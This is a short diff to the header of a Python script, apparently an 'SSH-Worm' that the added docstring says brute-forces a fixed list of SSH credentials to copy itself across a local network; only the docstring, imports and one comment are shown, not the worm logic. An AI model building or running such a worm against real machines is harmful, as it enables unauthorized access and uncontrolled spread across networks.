@@ -1,4 +1,10 @@
 """
+SSH-Worm
+
+Does no damage but replicates itself within local network.
+Brute force operation to try fixed set of credentials.
+May only work on Unix based machines.
+
 Author: Brian Sung
 Reference: https://github.com/luiscovar/worm-ssh
 """
@@ -6,7 +12,7 @@ import netifaces
 import nmap
 import paramiko
 import socket
-import os, time
+import os
 
 
 # Username and password to try
